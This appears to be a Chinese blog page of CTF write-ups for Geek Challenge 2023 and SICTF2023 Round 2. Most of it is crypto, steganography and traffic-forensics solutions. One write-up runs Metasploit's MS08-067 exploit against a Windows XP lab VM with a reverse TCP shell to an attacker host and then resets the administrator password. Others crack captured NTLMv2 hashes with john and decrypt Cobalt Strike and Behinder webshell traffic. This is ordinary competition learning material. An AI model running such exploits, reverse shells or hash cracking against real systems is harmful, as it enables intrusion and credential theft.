题目链接：nc 59.110.20.54:1789 （下sagemath! 不下的统统发配到安东星当嘿奴！） 分析： 1234a1*p1+a2*p2=1a3*p3+a4*p4=1a5*p5+a6*p6=1a0*p0+a*(a1*p1+a2*p2+a3*p3+a4*p4+a5*p5+a6*p6)=a0*p0+a*3=1 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcer = remote(&quot;59.110.20.54&quot;,1789)table = string.ascii_letters+string.digitsdef PoW(): r.recvuntil(b&quot;XXXX+&quot;) suffix = r.recv(16).decode(&quot;utf8&quot;) r.recvuntil(b&quot;== &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(b&#x27;XXXX: &#x27;, proof.encode()) PoW()def xgcd(a,b): prevx, x = 1, 0; prevy, y = 0, 1 while b: q, r = divmod(a,b) x, prevx = prevx - q*x, x y, prevy = prevy - q*y, y a, b = b, r return a, prevx, prevy for i in range(15): r.recvuntil(b&#x27;[&#x27;) p = eval(b&#x27;[&#x27;+r.recvuntil(b&#x27;]&#x27;)) _,a1,a2 = xgcd(p[1],p[2]) _,a3,a4 = xgcd(p[3],p[4]) _,a5,a6 = xgcd(p[5],p[6]) _,a0,a = xgcd(p[0],3) r.recvuntil(b&#x27;a6: &#x27;) r.sendline(f&#x27;&#123;a0&#125;,&#123;a*a1&#125;,&#123;a*a2&#125;,&#123;a*a3&#125;,&#123;a*a4&#125;,&#123;a*a5&#125;,&#123;a*a6&#125;&#x27;.encode()) print(r.recvline())r.interactive()# Congrats! Your flag is: SYC&#123;N0t_s0_e4sy_3xtgCd&#125; ​ Algebra Recently jrl888 has learned something about groebner_basis.But could U plz help him to sovle his linear algebra homework? 矩阵 1*32 * 32*16 = 1*16，构造格规约： 12345678910111213141516p = 76231309481023608274751321361920497941621991893430257210800219032855778863403M = [...]c = [...]M = matrix(ZZ, 32,16, M)I = identity_matrix(32)P = p * identity_matrix(16)C = matrix(ZZ, c)Z1 = zero_matrix(16,32)Z2 = zero_matrix(1,32)L = block_matrix(ZZ,[[M,I],[P,Z1],[C,Z2]])B = L.LLL()key = list(-B[1][16:])print(key)# [241, 234, 29, 209, 141, 236, 196, 125, 153, 121, 243, 104, 157, 250, 164, 197, 241, 85, 184, 247, 145, 27, 128, 184, 203, 233, 104, 196, 118, 255, 12, 24] 再根据 12345x1^e0%p=c0x2^e1%p=c1x3^e2%p=c2x1+x2+x3=sGB基解 12345678910111213141516171819202122232425262728key = [241, 234, 29, 209, 141, 236, 196, 125, 153, 121, 243, 104, 157, 250, 164, 197, 241, 85, 184, 247, 145, 27, 128, 184, 203, 233, 104, 196, 118, 255, 12, 24]key = int(bytes(key).hex(),16)print(key)c = [5415723658972576382153559473862560277755192970021711034483296770242757614573901416501357332661976379693731699836578087114136761491831672836130172409491889, 210713951733721296094981135225517096332793112439184310028590576805069783972692891743044656754643189870169698041576462365740899368554671164493356650858567594970345928936103914826926922045852943068526737627918609421198466329605091625, 93558120697660628972553751937347865465963385519812302371069578286123647411810258547153399045605149278436900736665388355004346922404097196048139360206875149390218160164739477798859206611473675859708579299466581718543909912951088772842957187413726251892347470983848602814387339449340072310561011153714207338630]p = 175336555462486363373099551411803174933803940918372428249159666803182759268063415863987676455854054651631174131625763475189413468427467197699058719725221879406119373683175842618465694427132003565774900609456204965408254598477034791500576573579131820364396996254469692964946065509325801687720344376041097328929s = 192597139210277682598060185912821582569043452465684540030278464832244948354365P.&lt;i&gt; = PolynomialRing(ZZ)f = i^3 - 10*i^2 + 31*i - 30res = f.roots()e = [k[0] for k in res]P.&lt;x1,x2,x3&gt; = PolynomialRing(Zmod(p))f1 = x1^e[2]-c[0]f2 = x2^e[1]-c[1]f3 = x3^e[0]-c[2]f4 = x1+x2+x3-sG = Ideal([f1, f2, f3, f4]).groebner_basis()print(G)m = &#x27;&#x27;for b in G: assert b.degree() == 1 mi = ZZ(-b(0, 0, 0)) print(bytes.fromhex(hex(mi^^key)[2:])) # b&#x27;SYC&#123;You_are_SYC&#123;You_are_SYC&#123;You_&#x27;# b&#x27;really_algebreally_algebreally_a&#x27;# b&#x27;ra_master&#125;\\x02\\x02ra_master&#125;\\x02\\x02ra_maste&#x27; flag：SYC&#123;You_are_really_algebra_master&#125;。 ​ MISCcheekin 请前往”三叶草小组Syclover”微信公众号输入flag获得flag 发送flag，下载图片，zsteg的b1,rgb,lsb,xy通道有 syc&#123;s4y_he110_t0_syclover&#125;。 ​ ez_smilemo 游戏通关即可得到flag内容，需要自行添加SYC&#123;&#125;包含。例: flag内容为 haha_haha 则最终flag为 SYC{haha_haha} 题目链接：https://pan.baidu.com/s/1Vfklz0_isBoHNylRv8um8w?pwd=geek hint: data.win 使用UndertaleModTool工具解包data.win，在string窗口找到：c20xbGVfMXNfQF9uMWNlX2dAbWU=，base64解码：sm1le_1s_@_n1ce_g@me。 flag：SYC&#123;sm1le_1s_@_n1ce_g@me&#125; ​ DEATH_N0TE “o2takuXX突然失踪了，你作为他的好朋友，决定去他的房间看看是否留下了什么线索…”。前置剧情题，flag有两段，隐写的信息有点多记得给信息拿全。 hint1: Stegsolve lsb hint2: 图片大小和像素点 png图片末尾提取出： IuS9oOaJvuWIsOS6huS4gOacrOOAikRFQVRIIE5PVEXjgIvvvIzlpb3lpYflv4PpqbHkvb/kvaDnv7vlvIDov5nmnKznrJTorrDvvIzkvaDpmIXor7vkuobkvb/nlKjop4TliJnvvIzkvYbmmK/kvaDmg4rorrblnLDlj5HnjrDliJrmiY3nmoTop4TliJnkuYvkuK3llK/ni6zmsqHmnInnrKwxMOadoS4uLiIKIuS9oOWGjeasoeWOu+ehruiupOaYr+WQpuWmguatpO+8jOeslOiusOS4iueahOaWh+Wtl+WNtOS7v+S9m+a0u+S6hui1t+adpe+8jOWcqOS9oOecvOS4reS4jeaWreWcsOaUvuWkp+e8qeWwj++8jOS9oOmXreS4iuS6huWPjOecvC4uLiIKIuWOn+acrOm7keiJsueahOaWh+Wtl+S4gOi9rOWPmOaIkOihgOe6ouiJsu+8jOivoeW8gueahOeUu+mdoui/mOaYr+WHuueOsOS6juS9oOeahOinhue9keiGnOWJje+8jOS9oOWGs+WumuS4jeWGjee6oOe7k+S6jumBl+WkseeahOinhOWIme+8jOW5u+iniea2iOWkseS6hi4uLiI= base64解码： &quot;你找到了一本《DEATH NOTE》，好奇心驱使你翻开这本笔记，你阅读了使用规则，但是你惊讶地发现刚才的规则之中唯独没有第10条...&quot; &quot;你再次去确认是否如此，笔记上的文字却仿佛活了起来，在你眼中不断地放大缩小，你闭上了双眼...&quot; &quot;原本黑色的文字一转变成血红色，诡异的画面还是出现于你的视网膜前，你决定不再纠结于遗失的规则，幻觉消失了...&quot; 没什么用，zsteg 在 b1,rgb,lsb,xy 通道提取出： IuS9oOe7p+e7reinguWvn+aJi+S4iua8hum7keiJsueahOeslOiusOacrO+8jOWGt+mdmeS4i+adpeeahOS9oOWPkeeOsOS6huiXj+WcqOWwgemdouacgOS4i+i+ueeahOS4gOihjOWwj+WtlzpTWUN7RDRAVGhfTjB0NF8iCiLkvaDmtY/op4jov4fmlbTkuKrnrJTorrDmnKzvvIzlj6/mg5zlhajmmK/nqbrnmb3pobXvvIzlhbbkuK3mnInkuIDpobXkuI3nn6XpgZPooqvosIHmkpXmjonkuobvvIzkvaDmnIDnu4jov5jmmK/nv7vliLDkuobnvLrlpLHnmoTpgqPkuIDpobUiCiLkvaDnlKjpk4XnrJTmtoLmirnnnYDlkI7pnaLkuIDpobXvvIzkuIrpnaLnvJPnvJPlh7rnjrDkuobpgZflpLHnmoTnl5Xov7kuLi4i base64解码： &quot;你继续观察手上漆黑色的笔记本，冷静下来的你发现了藏在封面最下边的一行小字:SYC&#123;D4@Th_N0t4_&quot; &quot;你浏览过整个笔记本，可惜全是空白页，其中有一页不知道被谁撕掉了，你最终还是翻到了缺失的那一页&quot; &quot;你用铅笔涂抹着后面一页，上面缓缓出现了遗失的痕迹...&quot; 得到flag前半段：SYC&#123;D4@Th_N0t4_。 放大图片，可发现白色像素点，结合题目查找为死亡笔记字体，字符串：TkFNRV9vMnRha3VYWH0 base64解码得到flag后半段：NAME_o2takuXX&#125;。 flag：SYC&#123;D4@Th_N0t4_NAME_o2takuXX&#125; ​ 下一站是哪儿呢 我和yxx去旅游，前一天还好好的，玩完《指挥官基恩》这个游戏就睡觉了，第二天晚上吃完饭她人就不见了，走之前留下了两张图片就消失了。你能帮我找找她坐哪个航班去哪个地方了嘛？ flag格式：SYC{航班号_城市拼音}，城市拼音首字母大写噢 查询 有白色钢琴的机场，配合百度以图搜图功能，查找到地点为：深圳宝安国际机场。 从1.jpg提取出zip压缩包，得到secret.png，为Standard Galactic Alphabet字体，利用在线网站解出信息为：I WANT TO GO TO LIQUOR CITY。 LIQUOR CITY=酒城=泸州市，城市拼音：Luzhou。 根据图片信息：时间8.25 20:19 马上起飞，在flightstats上查询深圳-泸州的航班号为：CZ8579。 flag：SYC&#123;CZ8579_Luzhou&#125; ​ Qingwan心都要碎了 Qingwan和Yxx一起去旅游，但是Qingwan睡的太死啦，Yxx丢下她一个人去玩了，她一觉起来只看见Yxx发的朋友圈，能帮Qingwan找到她吗？ flag格式：SYC{地点名字} 百度，以图搜图。 SYC&#123;重庆中国三峡博物馆&#125; ​ xqr Qrcode can deliver binary msg png分离得到两张png图片，按像素值异或操作即得到新二维码。 1234567891011121314151617from PIL import Imageimg1 = Image.open(&#x27;00000000.png&#x27;)img2 = Image.open(&#x27;00000001.png&#x27;)print(img1.size)print(img2.size)width , height = img2.sizeimg = Image.new(&#x27;RGB&#x27;,(width , height))for i in range(0,width): for j in range(0,height): x1 = 1 if img1.getpixel((3*i,3*j)) == (255, 255, 255, 255) else 0 x2 = 1 if img2.getpixel((i,j)) == (255, 255, 255) else 0 x = x1^x2 if x == 0: img.putpixel((i,j),(255,255,255)) else: img.putpixel((i,j),(0,0,0))img.save(&#x27;new.png&#x27;) flag：SYC&#123;hOp3_u_h@ve_Fun&#125; ​ DEATH_N1TE “你看见了《DEATH NOTE》上面的名字，这时，Arahat0给你传了两个文件，并留言:” “[他拥有死神之眼，请小心，他在找你，还剩1920秒…]” “&lt;当前时间 10:52&gt;”。flag有两段 webp文件在线转gif，使用gifsplitter拆分为880张图片。 猜测宽高为 40*22，合并：montage *.bmp -tile 40x22 -geometry +0+0 ../out.png 拼图：gaps --image=out.png --size=48 --save 得到文字：XzE0X0tpMTE0Un0==，base64解码得flag后半段：_14_Ki114R&#125;。 mp3文件提取SSTV信息：sstv -d L1.wav -o 1.png 得到的图片里的文字为flag前半段：SYC&#123;H4xr0t0r。 flag：SYC&#123;H4xr0t0r_14_Ki114R&#125; ​ 窃听风云 Hacker捕获到了一段敌对公司的对话信息流量，你能从流量中分析出Jack的密码吗，flag为SYC{password} NTLMSSP流量，利用提取工具 ntlmssp_extract 提取NTLM得： jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000 保存为hash文件，再用john解： john hash --wordlist=rockyou.txt 结果：iamjackspassword (jack) flag：SYC&#123;iamjackspassword&#125; ​ extractMe Try to extract me! 4字节CRC32爆破，利用CRC32 Tools分别爆破8段字符串： python crc32.py reverse 0xXXXXXXXX 拼接得flag：SYC&#123;_cR@ck_1s_Useful_sometime$_&#125; ​ 时代的眼泪 2001年的大屁股电脑，到了2023年会被揍得多惨呢？ 链接: https://pan.baidu.com/s/1GuvryuThIMn_fzhstWaKBA?pwd=geek 提取码: geek WinXP虚拟机，用VMWare加载但无登录密码。 参考：使用MSF 利用 ms08_067 对 XP 进行渗透 先对网段扫描IP：nmap -sC -sV 192.168.79.0/24 得到IP后，使用MSF攻击： 12345678910111213msf6 &gt; search ms08_067msf6 &gt; use exploit/windows/smb/ms08_067_netapimsf6 exploit(windows/smb/ms08_067_netapi) &gt; show payloadsmsf6 exploit(windows/smb/ms08_067_netapi) &gt; set payload generic/shell_reverse_tcpmsf6 exploit(windows/smb/ms08_067_netapi) &gt; show optionsmsf6 exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 192.168.79.132RHOST =&gt; 192.168.79.132msf6 exploit(windows/smb/ms08_067_netapi) &gt; set LPORT 4444 LPORT =&gt; 4444msf6 exploit(windows/smb/ms08_067_netapi) &gt; set LHOST 192.168.79.128LHOST =&gt; 192.168.79.128msf6 exploit(windows/smb/ms08_067_netapi) &gt; show optionsmsf6 exploit(windows/smb/ms08_067_netapi) &gt; run getshell之后，使用net命令修改administrator密码： net user administrator 123456 进入系统，桌面背景图得flag：SYC&#123;You_defeated_me_after_22_years&#125;。 ​ SimpleConnect Just so so 属于blockchain 题目链接：http://47.109.106.62:1234/ 用Remix编译后，执行 airdrop() 函数，即满足 isSolved() 条件， 得到flag：SYC&#123;kajd_u_iaak___hdskj_a&#125;。 ​ give_me_Goerlieth Great 属于blockchain 题目链接：http://47.109.106.62:1235/ 转账即可。 ​ DEATH_N2TE “你知道了真相，正带上《DEATH NOTE》准备逃离，恰好，Muscial发给你一个视频，并说:” “[这里记下了他的真名以及照片，请写在那本笔记上面，我和Arahat0都被他看见了真名…]”。 mp4分帧：ffmpeg -i kira.mp4 %05d.png 提取每一帧的列，组合： 12345678910111213from PIL import Imagewidth,height = 192,108img_new = Image.new(&#x27;RGB&#x27;,(width,height))for start in range(10): for i in range(width): img = Image.open(f&#x27;x/&#123;str(i+1).zfill(5)&#125;.png&#x27;) for j in range(height): tmp = img.getpixel((i*10+start,j*10+start)) img_new.putpixel((i,j),tmp) img_new.save(f&#x27;x/out_with_start_&#123;start&#125;.png&#x27;) start=5的时候，得flag：SYC&#123;we1c0m4_T0_De@tH_W0r1d&#125;。 ​ 窃听风云-V2 这次Hacker捕获到了Jack登录邮件系统的流量，你还能从流量中分析出Jack的密码吗，flag为SYC{password} SMTP流量，wireshark 解析ntlmssp，按照 Extracting NTLM Hash Values from a Wireshark packet capture 构造出ntlmssp： jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000 再用john爆破即可：john token.txt --wordlist=rockyou.txt 得到 jack100589barney (jack)，flag：SYC&#123;jack100589barney&#125;。 ​","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023赛","slug":"2023赛","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"SICTF2023 Round2","slug":"match-SICTF2023-Round2","date":"2023-09-10T05:39:56.000Z","updated":"2023-09-10T07:43:36.091Z","comments":true,"path":"2023/09/10/match-SICTF2023-Round2/","permalink":"https://lazzzaro.github.io/2023/09/10/match-SICTF2023-Round2/","excerpt":"","text":"​ SICTF2023 #Round2 是杭州电子科技大学信息工程学院和广东海洋大学联合举办的网络安全赛。 Rank: 4 MISC[签到]WelcomeSICTF&#123;Welcome_to_SICTF2023_#Round2&#125; ​ Pixel_artLSB隐写：zsteg -E &quot;b1,rgb,lsb,xy&quot; Pixel_art.png &gt; 1.png 提取RGB值： 123456789101112from PIL import Imageimg = Image.open(&#x27;1.png&#x27;)width , height = img.sizef = b&#x27;&#x27;for i in range(0,height): for j in range(0,width): tmp = img.getpixel((j,i)) f+=bytes(list(tmp)) print(f)# b&#x27;..................!?!!.?..................?.?!.?....!.?.......!?!!.?!!!!!!?.?!.?!!!.!!!!!!!!!!!!!.?.........!?!!.?........?.?!.?..!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!!!!!.?...............!?!!.?..............?.?!.?........!.?.................!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!...!.......!.!!!!!!!.?.............!?!!.?............?.?!.?........................!.....!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!!!.....!.!!!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?..............!.!!!!!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!.................!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!...............!.?.............!?!!.?............?.?!.?......................!.....!.!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?......!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!.!!!!!!!!!!!!!!!!!!!.............!.!!!!!!!!!!!!!!!!!!!...........!.!.............!.!!!!!!!!!!!!!!!!!...........!.?...............!?!!.?..............?.?!.?!.!!!!!.!!!!!.......!.!!!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!.!.?.................!?!!.?................?.?!.?............!.?.\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27; 在线ook解码，得flag：SICTF&#123;0141ac35-ec19-4cee-a906-22805fdbed77&#125;。 ​ 一起上号不Cobalt Strike流量分析，参考：https://blog.scrt.ch/2023/04/01/hex-filtrate/ 提取出最后一个流里的key，解析cookie： python3 cs-decrypt-metadata.py U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s= -f key 拿到Raw key后，再分析流量文件： python3 cs-parse-traffic.py -r 1ddb06c55884caf491bdb370ca48389c 11.pcapng 得到flag：SICTF&#123;88a39373-e204-43b6-b321-33ac8972fde9&#125; ​ baby_zip部分明文攻击，1.png 为png图片前18字节： rbkcrack -C flag.zip -c flag.png -p 1.png 得到key后再提取： rbkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png flag：SICTF&#123;3a4998b8-345e-4943-a689-d01e8b08defb&#125; ​ 还不上号flag1.pcapng是冰蝎流量，flag2.pcapng是CS流量。 先看flag2.pcapng，提取 key.zip 解压，key 中有零宽字符隐写，得到 cd52f1488563bf0e，是冰蝎流量的key。 flag1.pcapng中，参考Easy_Shark解密代码： 123456&lt;?php $key=&quot;cd52f1488563bf0e&quot;; $post=&quot;...&quot;; $post=openssl_decrypt($post, &quot;AES128&quot;, $key); print_r(base64_decode(json_decode($post, true)[&#x27;msg&#x27;]));?&gt; 将响应数据包中的base64字符串带入得到各流的解密内容： 123456789101112131415161718192021222324252627282930313233343536# 流2dvwa_email.pngflag.txtkeyshell.php# 流4SICTF&#123;79e1755e-08a8-4d# 流6rO0ABXNyABRzbGVlcC5ydW50aW1lLlNjYWxhcryvNaxLcOBGAwADTAAFYXJyYXl0ABtMc2xlZXAvcnVudGltZS9TY2FsYXJBcnJheTtMAARoYXNodAAaTHNsZWVwL3J1bnRpbWUvU2NhbGFySGFzaDtMAAV2YWx1ZXQAGkxzbGVlcC9ydW50aW1lL1NjYWxhclR5cGU7eHBzcgAec2xlZXAuZW5naW5lLnR5cGVzLk9iamVjdFZhbHVluXko22Ba54kCAAFMAAV2YWx1ZXQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwc3IAFWphdmEuc2VjdXJpdHkuS2V5UGFpcpcDDDrSzRKTAgACTAAKcHJpdmF0ZUtleXQAGkxqYXZhL3NlY3VyaXR5L1ByaXZhdGVLZXk7TAAJcHVibGljS2V5dAAZTGphdmEvc2VjdXJpdHkvUHVibGljS2V5O3hwc3IAFGphdmEuc2VjdXJpdHkuS2V5UmVwvflPs4iapUMCAARMAAlhbGdvcml0aG10ABJMamF2YS9sYW5nL1N0cmluZztbAAdlbmNvZGVkdAACW0JMAAZmb3JtYXRxAH4ADUwABHR5cGV0ABtMamF2YS9zZWN1cml0eS9LZXlSZXAkVHlwZTt4cHQAA1JTQXVyAAJbQqzzF/gGCFTgAgAAeHAAAAJ6MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAL0M6FR0Cb9dW52Nd5NTA1JUNAs1thS8iXx6QB+UkN/vRJdfsKS8dnOfNuPuPDCtx26B2j8I1FuTJ1VrrfDkzN585sskmXYronFM98Dx50vHaadOcDcDdBBqi8gC5/D3iKflX6T9pSL/5PVLfN1EIaFsyAS9jpWX2wGNi3C/QPSrAgMBAAECgYAdNhXeGtH4wkWqOhY8aurL+VvTUZjRanJ6C+/FkXCzUWbRVwVV5xMMeZEDNigRw4BZ2HGvJL+faMT+o3VMkCYBhGbi2/3RPRgigMG7Aa3LWWtYWsdbw8Mw6aqqbTjDUHrQ1kulMf1JvXJL5LBd+pBAQ8kHaYJRMcmnLsT4NeXOFQJBAMNa2r+phrThTlagMB6bj6vl0IVbDy+TJT2VybCSJ76rPgVUQwtPyX3z7UAjt27mE8KK+k7Jidi0drCEPv5Wo60CQQD3vQbO64fko1dlatkNn095GO9KoCuanrsLs+vYOhc0ltk4EhHHmP5hEE6dSMZNASKaN0wSYJ14xjnA+dJWOES3AkEApzyYF4vhLefTUIVBrHIvxFCw+fjCP1AQiXA5gVcdfzTJm3ZPDtf2/kRbzpTE68M7F0gykFAoGcQj92i/JKy24QJAdyVbA+M07Ro9qxHzJ+EJmMUMOMjFj8xtStiSQeDWTj2KZLQUBvmmxcnQ9UYN0PUNzjtwA5qhwXccSZoctcjECwJAZc0TZgGq/OwgnIyj/1+Q9D0A2eg3aw1k+6Vzkf/DdkuF6+XTkYTlBGiETIK/vm1rCH4NcOCL7eK5qpA1grg+gnQABlBLQ1MjOH5yABlqYXZhLnNlY3VyaXR5LktleVJlcCRUeXBlAAAAAAAAAAASAAB4cgAOamF2YS5sYW5nLkVudW0AAAAAAAAAABIAAHhwdAAHUFJJVkFURXNxAH4ADHEAfgARdXEAfgASAAAAojCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAvQzoVHQJv11bnY13k1MDUlQ0CzW2FLyJfHpAH5SQ3+9El1+wpLx2c5824+48MK3HboHaPwjUW5MnVWut8OTM3nzmyySZdiuicUz3wPHnS8dpp05wNwN0EGqLyALn8PeIp+VfpP2lIv/k9Ut83UQhoWzIBL2OlZfbAY2LcL9A9KsCAwEAAXQABVguNTA5fnEAfgAVdAAGUFVCTElDcHB4 将流6保存，为flag2.pcapng的实际key。 回到flag2.pcapng，解析cookie： python3 cs-decrypt-metadata.py j+ojKDVPlCr7lT9yzNinkj1DgdkcRaLMT2kL4U+9TvdFBZqGKk7/4WF/W7JhEieC3DoRfngRppMAVHa3yfhp4HZm/ZeNY4bc8rlYL11Q0dXDzpR5JjhqN+hGe9RBqPznoukShgQLhxT/DO7djxE5ROzi6NC52yZAaGPCSeLDyjg= -f realkey 拿到Raw key后，再分析流量文件： python3 cs-parse-traffic.py -r dfc36399da501802482005cf8c768086 flag2.pcapng 得到关键内容： F 0 09/06/2023 15:52:58 GNSC2OJTHA2S2NDDGA2TIMJVGQ4TSOJVPU====== base32解码得后半部分flag：3d-9385-4c0541549995&#125; flag：SICTF&#123;79e1755e-08a8-4d3d-9385-4c0541549995&#125; ​ Easy_Shark冰蝎流量，照着第一个流的PHP加密逻辑代码还原： 123456&lt;?php $key=&quot;2295d22e2d70888f&quot;; $post=&quot;...&quot;; $post=openssl_decrypt($post, &quot;AES128&quot;, $key); print_r(base64_decode(json_decode($post, true)[&#x27;msg&#x27;]));?&gt; 将响应数据包中的base64字符串带入得到各流的解密内容： 12345678910GronKey.txtdvwa_email.pngflag.txtshell.php# flag.txtTGLBOMSJNSRAJAZDEZXGHSJNZWHG# GronKey.txt1,50,61,8,9,20,63,41 Gronsfeld加密，替换成Vigenere加密： 123456789s = [1,50,61,8,9,20,63,41]import stringdic = string.ascii_lowercasekey = &#x27;&#x27;for k in s: key += dic[k%26]print(key)# byjijulp Vigenere解密，得 SICTFSHUMUISAGOODBOYYYYYYYYY。 flag：SICTF&#123;SHUMUISAGOODBOYYYYYYYYY&#125; ​ fast_morseaudacity调慢速度，再在线识别morse，得到 f2a09bf-7f4a-4269-93a5-c8a48360b03c。 ​ QR_QR_QR交互式01字符串还原二维码，且搞了1000层… 12345678910111213141516171819202122232425262728293031from pwn import *from PIL import Imagefrom pyzbar.pyzbar import decoder = remote(&#x27;210.44.151.51&#x27;,10144)for i in range(1000): print(i) x = r.recvuntil(b&#x27;Please&#x27;)[:-7].split(b&#x27;\\n&#x27;) MAX = len(x) pic = Image.new(&quot;RGB&quot;,(MAX,MAX)) s = b&#x27;&#x27;.join(x) i = 0 for y in range(0,MAX): for x in range(0,MAX): if(s[i] == ord(&#x27;0&#x27;)): pic.putpixel((x,y),(0,0,0)) else: pic.putpixel((x,y),(255,255,255)) i = i+1 pic.save(&quot;flag.png&quot;) decocdeQR = decode(Image.open(&quot;flag.png&quot;)) data = decocdeQR[0].data print(data) r.sendlineafter(b&#x27;code:&#x27;,data) print(r.recvline())r.interactive() ​ 问卷调查SICTF&#123;SICTF_Round3_will_do_even_better!&#125; ​ CRYPTO[签到]古典大杂烩base100-base62-base64-base58-base32-base62 SICTF&#123;fe853b49-8730-462e-86f5-fc8e9789f077&#125; ​ RadioCRT 12345678910111213n1 = n2 = n3 = c1 = c2 = c3 = e = 17mm = crt([c1,c2,c3],[n1,n2,n3])m = mm.nth_root(e, truncate_mode=True)print(bytes.fromhex(hex(m[0])[2:]))# b&#x27;SICTF&#123;fdc0afb5-1c81-46b9-a28a-241f5f64419d&#125;&#x27; ​ MingTianPaoMTP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import Crypto.Util.strxor as xoimport libnum, codecs, numpy as npdef isChr(x): if ord(&#x27;a&#x27;) &lt;= x and x &lt;= ord(&#x27;z&#x27;): return True if ord(&#x27;A&#x27;) &lt;= x and x &lt;= ord(&#x27;Z&#x27;): return True return Falsedef infer(index, pos): if msg[index, pos] != 0: return msg[index, pos] = ord(&#x27; &#x27;) for x in range(len(c)): if x != index: msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(&#x27; &#x27;)def know(index, pos, ch): msg[index, pos] = ord(ch) for x in range(len(c)): if x != index: msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(ch)dat = []def getSpace(): for index, x in enumerate(c): res = [xo.strxor(x, y) for y in c if x!=y] f = lambda pos: len(list(filter(isChr, [s[pos] for s in res]))) cnt = [f(pos) for pos in range(len(x))] for pos in range(len(x)): dat.append((f(pos), index, pos))c = [codecs.decode(x.strip().encode(), &#x27;hex&#x27;) for x in open(&#x27;Problem.txt&#x27;, &#x27;r&#x27;).readlines()]msg = np.zeros([len(c), len(c[0])], dtype=int)getSpace()dat = sorted(dat)[::-1]for w, index, pos in dat: infer(index, pos)know(1, 28, &#x27;a&#x27;)know(1, 24, &#x27;e&#x27;)know(1, 16, &#x27;t&#x27;)know(0, 10, &#x27; &#x27;)know(0, 12, &#x27;i&#x27;)print(&#x27;\\n&#x27;.join([&#x27;&#x27;.join([chr(c) for c in x]) for x in msg]))key = xo.strxor(c[0], &#x27;&#x27;.join([chr(c) for c in msg[0]]).encode())print(key)# Little Red Riding Hood promise# d to obey her mother. The gran# dmother lived out in the woods# , a half hour from the village# . When Little Red Riding Hood # entered the woods a wolf came # up to her. She did not know wh# at a wicked animal he was, and# was not afraid of him. &quot;Good # day to you, Little Red Riding # b&#x27;SICTF&#123;MTP_AtTack_is_w0nderFu1&#125;&#x27; ​ Easy_CopperSmithcoppersmith解已知p高位攻击。 12345678910111213141516n = c = ph = e = 65537PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (ph &lt;&lt; 230) + xpl = f.small_roots(X=2^230, beta=0.48, epsilon=0.02)[0]p = (ph &lt;&lt; 230) + plq = n//int(p)f = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;SICTF&#123;3f9366ed-b8e4-412f-bbd0-62616a24115c&#125;&#x27; ​ 签到题来咯！Related Message Attack（Franklin-Reiter攻击），爆破小 $e$。 123456789101112131415161718192021222324252627n = c1 = c2 = import binasciidef attack(c1, c2, n, e): PR.&lt;x&gt;=PolynomialRing(Zmod(n)) g1 = (114*x+2333)^e - c1 g2 = (514*x+4555)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]e = 2while e &lt; 2^10: m = attack(c1, c2, n, e) m = binascii.unhexlify(&quot;%x&quot; % int(m)) if m.isascii(): print(m) break e = next_prime(e) # 